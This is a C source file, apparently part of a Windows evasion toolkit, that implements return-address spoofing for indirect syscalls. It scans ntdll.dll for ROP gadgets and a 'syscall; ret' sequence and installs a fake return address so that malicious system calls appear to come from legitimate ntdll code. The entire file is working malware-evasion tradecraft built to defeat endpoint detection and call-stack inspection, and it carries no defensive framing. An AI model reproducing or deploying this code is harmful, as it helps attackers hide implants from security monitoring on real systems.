/**
 * return_spoof.c - Return-address spoofing for indirect syscall path.
 */
#include <windows.h>
#include "../../include/evasion.h"

typedef struct _SPOOF_FRAME {
    PVOID gadget_addr;
    PVOID return_addr;
    PVOID target_func;
} SPOOF_FRAME;

static PVOID g_ntdll_gadget = NULL;
static PVOID g_ntdll_return = NULL;
static BOOL  g_return_spoof_ready = FALSE;

/* Referenced from syscalls.x64.S when non-NULL. */
PVOID g_spoof_return_addr = NULL;

static PVOID scan_for_ret_gadget(PBYTE start, DWORD size) {
    if (!start || size < 5)
        return NULL;

    for (DWORD j = 0; j + 4 < size; j++) {
        /* add rsp, 0x28; ret */
        if (start[j] == 0x48 && start[j + 1] == 0x83 &&
            start[j + 2] == 0xC4 && start[j + 3] == 0x28 &&
            start[j + 4] == 0xC3) {
            return &start[j];
        }
        /* jmp [rsp] — FF 24 24 */
        if (j + 2 < size && start[j] == 0xFF &&
            start[j + 1] == 0x24 && start[j + 2] == 0x24) {
            return &start[j];
        }
    }
    return NULL;
}

static PVOID scan_for_syscall_ret(PBYTE start, PBYTE end) {
    if (!start || !end || start >= end)
        return NULL;

    for (PBYTE p = start; p + 2 < end; p++) {
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
            return p + 2;
    }
    return NULL;
}

BOOL setup_spoof_frame(PVOID gadget_addr, PVOID return_addr) {
    if (!gadget_addr || !return_addr)
        return FALSE;

    g_ntdll_gadget = gadget_addr;
    g_ntdll_return = return_addr;
    g_spoof_return_addr = return_addr;
    spoof_set_fake_ret(return_addr);
    return TRUE;
}

BOOL return_spoof_ready(void) {
    return g_return_spoof_ready;
}

BOOL return_spoof_apply(void) {
    if (!g_return_spoof_ready || !g_ntdll_return)
        return FALSE;
    g_spoof_return_addr = g_ntdll_return;
    spoof_set_fake_ret(g_ntdll_return);
    return TRUE;
}

void return_spoof_clear(void) {
    g_spoof_return_addr = NULL;
}

BOOL init_return_spoof(void) {
    if (g_return_spoof_ready)
        return TRUE;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        BYTE *start = (BYTE *)hNtdll + sec[i].VirtualAddress;
        DWORD size = sec[i].Misc.VirtualSize;
        PVOID gadget = scan_for_ret_gadget(start, size);
        if (gadget) {
            g_ntdll_gadget = gadget;
            break;
        }
    }

    if (!g_ntdll_gadget)
        return FALSE;

    PIMAGE_SECTION_HEADER text = sec;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0 ||
            (sec[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
            text = &sec[i];
            break;
        }
    }

    PBYTE text_start = (PBYTE)hNtdll + text->VirtualAddress;
    PBYTE text_end = text_start + text->Misc.VirtualSize;
    g_ntdll_return = scan_for_syscall_ret(text_start, text_end);

    if (!g_ntdll_return) {
        FARPROC rtl = GetProcAddress(hNtdll, "RtlUserThreadStart");
        if (rtl)
            g_ntdll_return = (PVOID)rtl;
    }

    if (!g_ntdll_return)
        return FALSE;

    g_return_spoof_ready = setup_spoof_frame(g_ntdll_gadget, g_ntdll_return);
    return g_return_spoof_ready;
}
